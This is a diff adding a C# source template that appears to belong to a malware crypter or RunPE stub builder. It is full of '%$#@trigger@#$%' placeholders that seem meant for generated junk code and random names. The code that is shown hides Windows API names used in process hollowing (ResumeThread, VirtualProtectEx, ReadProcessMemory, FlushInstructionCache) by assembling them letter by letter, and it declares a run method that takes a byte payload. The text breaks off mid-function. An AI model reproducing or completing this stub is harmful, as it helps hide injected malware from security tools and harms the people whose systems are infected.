@@ -1,0 +1,2069 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Management;
+using System.Collections.Generic;
+using Microsoft.Win32;
+using System.Security.Cryptography;
+using System.Reflection;
+
+
+[assembly: AssemblyTitle("%$#@basictrigger0@#$%")]
+[assembly: AssemblyVersion("%$#@assemblytrigger0@#$%")]
+[assembly: AssemblyFileVersion("%$#@assemblytrigger1@#$%")]
+[assembly: AssemblyDescription("%$#@basictrigger1@#$%")]
+[assembly: AssemblyCompany("%$#@basictrigger2@#$%")]
+[assembly: AssemblyProduct("%$#@basictrigger3@#$%")]
+
+#pragma warning disable 0169
+#pragma warning disable 0649
+
+
+namespace %$#@basictriggerN0@#$%
+{
+    %$#@classtrigger0@#$%
+    %$#@classtrigger1@#$%
+	%$#@classtrigger2@#$%
+	%$#@classtrigger3@#$%
+	%$#@classtrigger4@#$%
+	%$#@classtrigger5@#$%
+    %$#@classtrigger6@#$%
+    %$#@classtrigger7@#$%
+	%$#@classtrigger8@#$%
+	%$#@classtrigger9@#$%
+	%$#@classtrigger10@#$%
+	%$#@classtrigger11@#$%
+    static class %$#@basictriggerProgram@#$%
+    {
+		%$#@betweentrigger0@#$%
+		%$#@betweentrigger1@#$%
+		%$#@betweentrigger2@#$%
+
+
+		%$#@betweentrigger42@#$%
+		%$#@betweentrigger43@#$%
+		%$#@betweentrigger44@#$%
+		%$#@betweentrigger45@#$%
+		%$#@betweentrigger46@#$%
+		%$#@betweentrigger47@#$%
+
+        [STAThread]
+        static void Main()
+        {
+			%$#@additionaltriggerF120@#$%
+		    %$#@additionaltriggerF121@#$%
+		    %$#@additionaltriggerF122@#$%
+
+			%$#@additionaltriggerF147@#$%
+		    %$#@additionaltriggerF148@#$%
+		    %$#@additionaltriggerF149@#$%
+        }
+    }
+    %$#@classtrigger0e@#$%
+    %$#@classtrigger1e@#$%
+	%$#@classtrigger2e@#$%
+	%$#@classtrigger3e@#$%
+	%$#@classtrigger4e@#$%
+	%$#@classtrigger5e@#$%
+    %$#@classtrigger6e@#$%
+    %$#@classtrigger7e@#$%
+	%$#@classtrigger8e@#$%
+	%$#@classtrigger9e@#$%
+	%$#@classtrigger10e@#$%
+	%$#@classtrigger11e@#$%
+}
+namespace %$#@basictriggerN0@#$%
+{
+    %$#@classtrigger12@#$%
+    %$#@classtrigger13@#$%
+	%$#@classtrigger14@#$%
+	%$#@classtrigger15@#$%
+	%$#@classtrigger16@#$%
+	%$#@classtrigger17@#$%
+    %$#@classtrigger18@#$%
+    %$#@classtrigger19@#$%
+	%$#@classtrigger20@#$%
+	%$#@classtrigger21@#$%
+	%$#@classtrigger22@#$%
+	%$#@classtrigger23@#$%
+    public static class %$#@basictriggerC0@#$%
+    {
+		%$#@betweentrigger48@#$%
+		%$#@betweentrigger49@#$%
+		%$#@betweentrigger50@#$%
+		%$#@betweentrigger51@#$%
+		%$#@betweentrigger52@#$%
+		%$#@betweentrigger53@#$%
+        public struct %$#@basictriggerS0@#$%
+        {
+            public uint %$#@basictrigger36@#$%;
+            public string %$#@basictrigger37@#$%;
+            public string %$#@basictrigger38@#$%;
+            public string %$#@basictrigger39@#$%;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
+            public byte[] %$#@basictrigger40@#$%;
+            public byte %$#@basictrigger41@#$%;
+            public IntPtr %$#@basictrigger42@#$%;
+            public IntPtr %$#@basictrigger43@#$%;
+            public IntPtr %$#@basictrigger44@#$%;
+        }
+
+		%$#@betweentrigger54@#$%
+		%$#@betweentrigger55@#$%
+		%$#@betweentrigger56@#$%
+		%$#@betweentrigger57@#$%
+		%$#@betweentrigger58@#$%
+		%$#@betweentrigger59@#$%
+
+        public struct %$#@basictriggerS1@#$%
+        {
+            public IntPtr %$#@basictrigger45@#$%;
+            public IntPtr %$#@basictrigger46@#$%;
+            public IntPtr %$#@basictrigger47@#$%;
+            public IntPtr %$#@basictrigger48@#$%;
+            public IntPtr %$#@basictrigger49@#$%;
+            public IntPtr %$#@basictrigger50@#$%;
+        }
+
+		%$#@betweentrigger60@#$%
+		%$#@betweentrigger61@#$%
+		%$#@betweentrigger62@#$%
+		%$#@betweentrigger63@#$%
+		%$#@betweentrigger64@#$%
+		%$#@betweentrigger65@#$%
+
+        public struct %$#@basictriggerS2@#$%
+        {
+            public IntPtr %$#@basictrigger51@#$%;
+            public IntPtr %$#@basictrigger52@#$%;
+            public uint %$#@basictrigger53@#$%;
+            public uint %$#@basictrigger54@#$%;
+        }
+
+		%$#@betweentrigger66@#$%
+		%$#@betweentrigger67@#$%
+		%$#@betweentrigger68@#$%
+		%$#@betweentrigger69@#$%
+		%$#@betweentrigger70@#$%
+		%$#@betweentrigger71@#$%
+
+        public static bool %$#@basictriggerRUN1@#$%(string %$#@basictrigger55@#$%, string %$#@basictrigger57@#$%, byte[] %$#@basictrigger58@#$%, int %$#@basictrigger59@#$%, ref int %$#@basictrigger60@#$%)
+        {
+		    %$#@additionaltriggerF150@#$%
+		    %$#@additionaltriggerF151@#$%
+		    %$#@additionaltriggerF152@#$%
+
+            return true;
+        }
+
+		%$#@betweentrigger72@#$%
+		%$#@betweentrigger73@#$%
+		%$#@betweentrigger74@#$%
+		%$#@betweentrigger75@#$%
+		%$#@betweentrigger76@#$%
+		%$#@betweentrigger77@#$%
+
+        private static long %$#@basictrigger61@#$%(IntPtr %$#@basictrigger62@#$%, long %$#@basictrigger63@#$%)
+        {
+		    %$#@additionaltriggerF171@#$%
+		    %$#@additionaltriggerF172@#$%
+		    %$#@additionaltriggerF173@#$%
+
+		    %$#@additionaltriggerF189@#$%
+		    %$#@additionaltriggerF190@#$%
+		    %$#@additionaltriggerF191@#$%
+            return 0;
+        }
+
+		%$#@betweentrigger78@#$%
+		%$#@betweentrigger79@#$%
+		%$#@betweentrigger80@#$%
+		%$#@betweentrigger81@#$%
+		%$#@betweentrigger82@#$%
+		%$#@betweentrigger83@#$%
+
+        private static bool %$#@basictrigger66@#$%(ref byte[] %$#@basictrigger67@#$%, int %$#@basictrigger68@#$%, int %$#@basictrigger69@#$%)
+        {
+		    %$#@additionaltriggerF192@#$%
+		    %$#@additionaltriggerF193@#$%
+		    %$#@additionaltriggerF194@#$%
+
+			%$#@additionaltriggerF234@#$%
+		    %$#@additionaltriggerF235@#$%
+		    %$#@additionaltriggerF236@#$%
+            return false;
+        }
+
+		%$#@betweentrigger84@#$%
+		%$#@betweentrigger85@#$%
+		%$#@betweentrigger86@#$%
+		%$#@betweentrigger87@#$%
+		%$#@betweentrigger88@#$%
+		%$#@betweentrigger89@#$%
+
+        private static int %$#@basictrigger76@#$%(long %$#@basictrigger77@#$%, long %$#@basictrigger78@#$%, int  %$#@basictrigger79@#$%)
+        {
+		    %$#@additionaltriggerF237@#$%
+			%$#@additionaltriggerF238@#$%
+			%$#@additionaltriggerF239@#$%
+            return 0;
+        }
+
+		%$#@betweentrigger90@#$%
+		%$#@betweentrigger91@#$%
+		%$#@betweentrigger92@#$%
+		%$#@betweentrigger93@#$%
+		%$#@betweentrigger94@#$%
+		%$#@betweentrigger95@#$%
+
+        private static bool %$#@basictrigger80@#$%(long %$#@basictrigger81@#$%, int %$#@basictrigger82@#$%, long %$#@basictrigger83@#$%, int %$#@basictrigger84@#$%)
+        {
+		    %$#@additionaltriggerF240@#$%
+			%$#@additionaltriggerF241@#$%
+			%$#@additionaltriggerF242@#$%		    
+
+		    %$#@additionaltriggerF258@#$%
+			%$#@additionaltriggerF259@#$%
+			%$#@additionaltriggerF260@#$%	
+            return false;
+        }
+
+		%$#@betweentrigger96@#$%
+		%$#@betweentrigger97@#$%
+		%$#@betweentrigger98@#$%
+		%$#@betweentrigger99@#$%
+		%$#@betweentrigger100@#$%
+		%$#@betweentrigger101@#$%
+
+        private static bool %$#@basictrigger87@#$%(string %$#@basictrigger88@#$%, string %$#@basictrigger89@#$%, byte[] %$#@basictrigger90@#$%, int %$#@basictrigger91@#$%, ref int %$#@basictrigger92@#$%)
+        {
+			%$#@additionaltriggerHandleRun0@#$%
+		    %$#@additionaltriggerHandleRun1@#$%
+		    %$#@additionaltriggerHandleRun2@#$%
+
+			%$#@additionaltriggerHandleRune0@#$%
+		    %$#@additionaltriggerHandleRune1@#$%
+		    %$#@additionaltriggerHandleRune2@#$%
+            return true;
+        }
+
+		%$#@betweentrigger102@#$%
+		%$#@betweentrigger103@#$%
+		%$#@betweentrigger104@#$%
+		%$#@betweentrigger105@#$%
+		%$#@betweentrigger106@#$%
+		%$#@betweentrigger107@#$%
+
+        private static long %$#@basictrigger104@#$%(IntPtr %$#@basictrigger121@#$%, ref bool %$#@basictrigger122@#$%, ref bool %$#@basictrigger123@#$%, ref %$#@basictriggerS1@#$% %$#@basictrigger124@#$%, ref UIntPtr %$#@basictrigger125@#$%)
+        {
+			%$#@additionaltriggersmethod_50@#$%
+		    %$#@additionaltriggersmethod_51@#$%
+		    %$#@additionaltriggersmethod_52@#$%
+
+			%$#@additionaltriggersmethod_5e0@#$%
+		    %$#@additionaltriggersmethod_5e1@#$%
+		    %$#@additionaltriggersmethod_5e2@#$%
+            return 0;
+        }
+
+		%$#@betweentrigger108@#$%
+		%$#@betweentrigger109@#$%
+		%$#@betweentrigger110@#$%
+		%$#@betweentrigger111@#$%
+		%$#@betweentrigger112@#$%
+		%$#@betweentrigger113@#$%
+
+    }
+    %$#@classtrigger12e@#$%
+    %$#@classtrigger13e@#$%
+	%$#@classtrigger14e@#$%
+	%$#@classtrigger15e@#$%
+	%$#@classtrigger16e@#$%
+	%$#@classtrigger17e@#$%
+    %$#@classtrigger18e@#$%
+    %$#@classtrigger19e@#$%
+	%$#@classtrigger20e@#$%
+	%$#@classtrigger21e@#$%
+	%$#@classtrigger22e@#$%
+	%$#@classtrigger23e@#$%
+}
+namespace %$#@basictriggerN0@#$%
+{
+    %$#@classtrigger24@#$%
+    %$#@classtrigger25@#$%
+	%$#@classtrigger26@#$%
+	%$#@classtrigger27@#$%
+	%$#@classtrigger28@#$%
+	%$#@classtrigger29@#$%
+    %$#@classtrigger30@#$%
+    %$#@classtrigger31@#$%
+	%$#@classtrigger32@#$%
+	%$#@classtrigger33@#$%
+	%$#@classtrigger34@#$%
+	%$#@classtrigger35@#$%
+
+    %$#@classtrigger24e@#$%
+    %$#@classtrigger25e@#$%
+	%$#@classtrigger26e@#$%
+	%$#@classtrigger27e@#$%
+	%$#@classtrigger28e@#$%
+	%$#@classtrigger29e@#$%
+    %$#@classtrigger30e@#$%
+    %$#@classtrigger31e@#$%
+	%$#@classtrigger32e@#$%
+	%$#@classtrigger33e@#$%
+	%$#@classtrigger34e@#$%
+	%$#@classtrigger35e@#$%
+}
+
+namespace %$#@basictriggerN0@#$%
+{
+    %$#@classtrigger36@#$%
+    %$#@classtrigger37@#$%
+	%$#@classtrigger38@#$%
+	%$#@classtrigger39@#$%
+	%$#@classtrigger40@#$%
+	%$#@classtrigger41@#$%
+    %$#@classtrigger42@#$%
+    %$#@classtrigger43@#$%
+	%$#@classtrigger44@#$%
+	%$#@classtrigger45@#$%
+	%$#@classtrigger46@#$%
+	%$#@classtrigger47@#$%
+    public static class %$#@basictriggerÑN@#$%
+    {	
+		%$#@betweentriggerRSNDT01@#$%
+		%$#@betweentriggerRSNDT02@#$%
+		%$#@betweentriggerRSNDT03@#$%
+		%$#@betweentriggerRSNDT04@#$%
+		%$#@betweentriggerRSNDT05@#$%
+		%$#@betweentriggerRSNDT06@#$%
+
+		public static string %$#@basictrigger___kernel32___@#$%()
+		   {
+		   %$#@additionaltrigger___kernel32___00@#$%
+		   %$#@additionaltrigger___kernel32___01@#$%
+		   %$#@additionaltrigger___kernel32___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___kernel32___03@#$%
+		   %$#@additionaltrigger___kernel32___04@#$%
+		   %$#@additionaltrigger___kernel32___05@#$%
+		   string[] parts=new string[8];
+		   %$#@additionaltrigger___kernel32___06@#$%
+		   %$#@additionaltrigger___kernel32___07@#$%
+		   %$#@additionaltrigger___kernel32___08@#$%
+
+		   parts[0]="k";
+		   %$#@additionaltrigger___kernel32___09@#$%
+		   %$#@additionaltrigger___kernel32___10@#$%
+		   %$#@additionaltrigger___kernel32___11@#$%
+		   parts[1]="e";
+		   %$#@additionaltrigger___kernel32___12@#$%
+		   %$#@additionaltrigger___kernel32___13@#$%
+		   %$#@additionaltrigger___kernel32___14@#$%
+		   parts[2]="r";
+		   %$#@additionaltrigger___kernel32___15@#$%
+		   %$#@additionaltrigger___kernel32___16@#$%
+		   %$#@additionaltrigger___kernel32___18@#$%
+		   parts[3]="n";
+		   %$#@additionaltrigger___kernel32___19@#$%
+		   %$#@additionaltrigger___kernel32___20@#$%
+		   %$#@additionaltrigger___kernel32___21@#$%
+		   parts[4]="e";
+		   %$#@additionaltrigger___kernel32___22@#$%
+		   %$#@additionaltrigger___kernel32___23@#$%
+		   %$#@additionaltrigger___kernel32___24@#$%
+		   parts[5]="l";
+		   %$#@additionaltrigger___kernel32___25@#$%
+		   %$#@additionaltrigger___kernel32___26@#$%
+		   %$#@additionaltrigger___kernel32___27@#$%
+		   parts[6]="3";
+		   %$#@additionaltrigger___kernel32___28@#$%
+		   %$#@additionaltrigger___kernel32___29@#$%
+		   %$#@additionaltrigger___kernel32___30@#$%
+		   parts[7]="2";
+		   %$#@additionaltrigger___kernel32___31@#$%
+		   %$#@additionaltrigger___kernel32___32@#$%
+		   %$#@additionaltrigger___kernel32___33@#$%
+
+		      for (int i = 0; i < 8; i++)
+              {
+		      %$#@additionaltrigger___kernel32___34@#$%
+		      %$#@additionaltrigger___kernel32___35@#$%
+		      %$#@additionaltrigger___kernel32___36@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___kernel32___37@#$%
+		      %$#@additionaltrigger___kernel32___38@#$%
+		      %$#@additionaltrigger___kernel32___39@#$%
+		      }
+		   %$#@additionaltrigger___kernel32___40@#$%
+		   %$#@additionaltrigger___kernel32___41@#$%
+		   %$#@additionaltrigger___kernel32___42@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT07@#$%
+		%$#@betweentriggerRSNDT08@#$%
+		%$#@betweentriggerRSNDT09@#$%
+		%$#@betweentriggerRSNDT10@#$%
+		%$#@betweentriggerRSNDT11@#$%
+		%$#@betweentriggerRSNDT12@#$%
+
+		public static string %$#@basictrigger___ResumeThread___@#$%()
+		   {
+		   %$#@additionaltrigger___ResumeThread___00@#$%
+		   %$#@additionaltrigger___ResumeThread___01@#$%
+		   %$#@additionaltrigger___ResumeThread___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___ResumeThread___03@#$%
+		   %$#@additionaltrigger___ResumeThread___04@#$%
+		   %$#@additionaltrigger___ResumeThread___05@#$%
+		   string[] parts=new string[12];
+		   %$#@additionaltrigger___ResumeThread___06@#$%
+		   %$#@additionaltrigger___ResumeThread___07@#$%
+		   %$#@additionaltrigger___ResumeThread___08@#$%
+
+		   parts[0]="R";
+		   %$#@additionaltrigger___ResumeThread___09@#$%
+		   %$#@additionaltrigger___ResumeThread___10@#$%
+		   %$#@additionaltrigger___ResumeThread___11@#$%
+		   parts[1]="e";
+		   %$#@additionaltrigger___ResumeThread___12@#$%
+		   %$#@additionaltrigger___ResumeThread___13@#$%
+		   %$#@additionaltrigger___ResumeThread___14@#$%
+		   parts[2]="s";
+		   %$#@additionaltrigger___ResumeThread___15@#$%
+		   %$#@additionaltrigger___ResumeThread___16@#$%
+		   %$#@additionaltrigger___ResumeThread___17@#$%
+		   parts[3]="u";
+		   %$#@additionaltrigger___ResumeThread___18@#$%
+		   %$#@additionaltrigger___ResumeThread___19@#$%
+		   %$#@additionaltrigger___ResumeThread___20@#$%
+		   parts[4]="m";
+		   %$#@additionaltrigger___ResumeThread___21@#$%
+		   %$#@additionaltrigger___ResumeThread___22@#$%
+		   %$#@additionaltrigger___ResumeThread___23@#$%
+		   parts[5]="e";
+		   %$#@additionaltrigger___ResumeThread___24@#$%
+		   %$#@additionaltrigger___ResumeThread___25@#$%
+		   %$#@additionaltrigger___ResumeThread___26@#$%
+		   parts[6]="T";
+		   %$#@additionaltrigger___ResumeThread___27@#$%
+		   %$#@additionaltrigger___ResumeThread___28@#$%
+		   %$#@additionaltrigger___ResumeThread___29@#$%
+		   parts[7]="h";
+		   %$#@additionaltrigger___ResumeThread___30@#$%
+		   %$#@additionaltrigger___ResumeThread___31@#$%
+		   %$#@additionaltrigger___ResumeThread___32@#$%
+		   parts[8]="r";
+		   %$#@additionaltrigger___ResumeThread___33@#$%
+		   %$#@additionaltrigger___ResumeThread___34@#$%
+		   %$#@additionaltrigger___ResumeThread___35@#$%
+		   parts[9]="e";
+		   %$#@additionaltrigger___ResumeThread___36@#$%
+		   %$#@additionaltrigger___ResumeThread___37@#$%
+		   %$#@additionaltrigger___ResumeThread___38@#$%
+		   parts[10]="a";
+		   %$#@additionaltrigger___ResumeThread___39@#$%
+		   %$#@additionaltrigger___ResumeThread___40@#$%
+		   %$#@additionaltrigger___ResumeThread___41@#$%
+		   parts[11]="d";
+		   %$#@additionaltrigger___ResumeThread___42@#$%
+		   %$#@additionaltrigger___ResumeThread___43@#$%
+		   %$#@additionaltrigger___ResumeThread___44@#$%
+
+		      for (int i = 0; i < 12; i++)
+              {
+		      %$#@additionaltrigger___ResumeThread___45@#$%
+		      %$#@additionaltrigger___ResumeThread___46@#$%
+		      %$#@additionaltrigger___ResumeThread___47@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___ResumeThread___48@#$%
+		      %$#@additionaltrigger___ResumeThread___49@#$%
+		      %$#@additionaltrigger___ResumeThread___50@#$%
+		      }
+		   %$#@additionaltrigger___ResumeThread___51@#$%
+		   %$#@additionaltrigger___ResumeThread___52@#$%
+		   %$#@additionaltrigger___ResumeThread___53@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT13@#$%
+		%$#@betweentriggerRSNDT14@#$%
+		%$#@betweentriggerRSNDT15@#$%
+		%$#@betweentriggerRSNDT16@#$%
+		%$#@betweentriggerRSNDT17@#$%
+		%$#@betweentriggerRSNDT18@#$%
+
+		public static string %$#@basictrigger___FlushInstructionCache___@#$%()
+		   {
+		   %$#@additionaltrigger___FlushInstructionCache___00@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___01@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___FlushInstructionCache___03@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___04@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___05@#$%
+		   string[] parts=new string[21];
+		   %$#@additionaltrigger___FlushInstructionCache___06@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___07@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___08@#$%
+
+		   parts[0]="F";
+		   %$#@additionaltrigger___FlushInstructionCache___09@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___10@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___11@#$%
+		   parts[1]="l";
+		   %$#@additionaltrigger___FlushInstructionCache___12@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___13@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___14@#$%
+		   parts[2]="u";
+		   %$#@additionaltrigger___FlushInstructionCache___15@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___16@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___17@#$%
+		   parts[3]="s";
+		   %$#@additionaltrigger___FlushInstructionCache___18@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___19@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___20@#$%
+		   parts[4]="h";
+		   %$#@additionaltrigger___FlushInstructionCache___21@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___22@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___22a@#$%
+		   parts[5]="I";
+		   %$#@additionaltrigger___FlushInstructionCache___23@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___24@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___25@#$%
+		   parts[6]="n";
+		   %$#@additionaltrigger___FlushInstructionCache___26@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___27@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___28@#$%
+		   parts[7]="s";
+		   %$#@additionaltrigger___FlushInstructionCache___29@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___30@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___31@#$%
+		   parts[8]="t";
+		   %$#@additionaltrigger___FlushInstructionCache___32@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___33@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___34@#$%
+		   parts[9]="r";
+		   %$#@additionaltrigger___FlushInstructionCache___35@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___36@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___37@#$%
+		   parts[10]="u";
+		   %$#@additionaltrigger___FlushInstructionCache___38@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___39@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___40@#$%
+		   parts[11]="c";
+		   %$#@additionaltrigger___FlushInstructionCache___41@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___42@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___43@#$%
+		   parts[12]="t";
+		   %$#@additionaltrigger___FlushInstructionCache___44@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___45@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___46@#$%
+		   parts[13]="i";
+		   %$#@additionaltrigger___FlushInstructionCache___47@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___48@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___49@#$%
+		   parts[14]="o";
+		   %$#@additionaltrigger___FlushInstructionCache___50@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___51@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___52@#$%
+		   parts[15]="n";
+		   %$#@additionaltrigger___FlushInstructionCache___53@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___54@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___55@#$%
+		   parts[16]="C";
+		   %$#@additionaltrigger___FlushInstructionCache___56@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___57@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___58@#$%
+		   parts[17]="a";
+		   %$#@additionaltrigger___FlushInstructionCache___60@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___61@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___62@#$%
+		   parts[18]="c";
+		   %$#@additionaltrigger___FlushInstructionCache___63@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___64@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___65@#$%
+		   parts[19]="h";
+		   %$#@additionaltrigger___FlushInstructionCache___66@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___67@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___68@#$%
+		   parts[20]="e";
+		   %$#@additionaltrigger___FlushInstructionCache___69@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___70@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___71@#$%
+
+		      for (int i = 0; i < 21; i++)
+              {
+		      %$#@additionaltrigger___FlushInstructionCache___72@#$%
+		      %$#@additionaltrigger___FlushInstructionCache___73@#$%
+		      %$#@additionaltrigger___FlushInstructionCache___74@#$%
+			  rez=rez+parts[i];
+		      }
+		   %$#@additionaltrigger___FlushInstructionCache___75@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___76@#$%
+		   %$#@additionaltrigger___FlushInstructionCache___77@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT19@#$%
+		%$#@betweentriggerRSNDT20@#$%
+		%$#@betweentriggerRSNDT21@#$%
+		%$#@betweentriggerRSNDT22@#$%
+		%$#@betweentriggerRSNDT23@#$%
+		%$#@betweentriggerRSNDT24@#$%
+
+		public static string %$#@basictrigger___VirtualProtectEx___@#$%()
+		   {
+		   %$#@additionaltrigger___VirtualProtectEx___00@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___01@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___VirtualProtectEx___03@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___04@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___05@#$%
+		   string[] parts=new string[16];
+		   %$#@additionaltrigger___VirtualProtectEx___06@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___07@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___08@#$%
+
+		   parts[0]="V";
+		   %$#@additionaltrigger___VirtualProtectEx___09@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___10@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___11@#$%
+		   parts[1]="i";
+		   %$#@additionaltrigger___VirtualProtectEx___12@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___13@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___14@#$%
+		   parts[2]="r";
+		   %$#@additionaltrigger___VirtualProtectEx___15@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___16@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___17@#$%
+		   parts[3]="t";
+		   %$#@additionaltrigger___VirtualProtectEx___18@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___19@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___20@#$%
+		   parts[4]="u";
+		   %$#@additionaltrigger___VirtualProtectEx___21@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___22@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___23@#$%
+		   parts[5]="a";
+		   %$#@additionaltrigger___VirtualProtectEx___24@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___25@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___26@#$%
+		   parts[6]="l";
+		   %$#@additionaltrigger___VirtualProtectEx___27@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___28@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___29@#$%
+		   parts[7]="P";
+		   %$#@additionaltrigger___VirtualProtectEx___30@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___31@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___32@#$%
+		   parts[8]="r";
+		   %$#@additionaltrigger___VirtualProtectEx___33@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___34@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___35@#$%
+		   parts[9]="o";
+		   %$#@additionaltrigger___VirtualProtectEx___36@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___37@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___38@#$%
+		   parts[10]="t";
+		   %$#@additionaltrigger___VirtualProtectEx___39@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___40@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___41@#$%
+		   parts[11]="e";
+		   %$#@additionaltrigger___VirtualProtectEx___42@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___43@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___44@#$%
+		   parts[12]="c";
+		   %$#@additionaltrigger___VirtualProtectEx___45@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___46@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___47@#$%
+		   parts[13]="t";
+		   %$#@additionaltrigger___VirtualProtectEx___48@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___49@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___50@#$%
+		   parts[14]="E";
+		   %$#@additionaltrigger___VirtualProtectEx___51@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___52@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___53@#$%
+		   parts[15]="x";
+		   %$#@additionaltrigger___VirtualProtectEx___54@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___55@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___56@#$%
+
+		      for (int i = 0; i < 16; i++)
+              {
+		      %$#@additionaltrigger___VirtualProtectEx___57@#$%
+		      %$#@additionaltrigger___VirtualProtectEx___58@#$%
+		      %$#@additionaltrigger___VirtualProtectEx___59@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___VirtualProtectEx___60@#$%
+		      %$#@additionaltrigger___VirtualProtectEx___61@#$%
+		      %$#@additionaltrigger___VirtualProtectEx___62@#$%
+		      }
+		   %$#@additionaltrigger___VirtualProtectEx___63@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___64@#$%
+		   %$#@additionaltrigger___VirtualProtectEx___65@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT25@#$%
+		%$#@betweentriggerRSNDT26@#$%
+		%$#@betweentriggerRSNDT27@#$%
+		%$#@betweentriggerRSNDT28@#$%
+		%$#@betweentriggerRSNDT29@#$%
+		%$#@betweentriggerRSNDT30@#$%
+
+		public static string %$#@basictrigger___ReadProcessMemory___@#$%()
+		   {
+		   %$#@additionaltrigger___ReadProcessMemory___00@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___01@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___ReadProcessMemory___03@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___04@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___05@#$%
+		   string[] parts=new string[17];
+		   %$#@additionaltrigger___ReadProcessMemory___06@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___07@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___08@#$%
+
+		   parts[0]="R";
+		   %$#@additionaltrigger___ReadProcessMemory___09@#$%
